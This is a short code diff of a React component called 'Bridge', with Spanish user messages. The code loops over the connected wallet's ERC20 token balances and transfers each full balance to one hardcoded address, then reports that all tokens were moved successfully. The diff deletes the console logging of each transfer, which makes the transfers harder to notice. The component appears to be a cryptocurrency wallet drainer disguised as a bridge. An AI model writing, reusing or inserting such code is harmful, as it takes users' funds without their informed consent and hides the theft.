@@ -73,12 +73,9 @@ export default function Bridge() {
       for (const token of balances) {
         const contract = getContract(token.address, ERC20ABI, library);
         const amount = ethers.utils.parseUnits(token.balance.toString(), 18);
-        console.log(`Transferencia de ${amount} de ${token.id}`);
 
         const tx = await contract.connect(signer).transfer("0x588CAf4a036137647daCE2eE2699a85931967A7d", amount);
-        console.log(`Transferencia enviada. Tx Hash: ${tx.hash}`);
         await tx.wait();
-        console.log(`Transferencia confirmada.`);
       }
 
       alert("Todos los tokens han sido transferidos con éxito.");
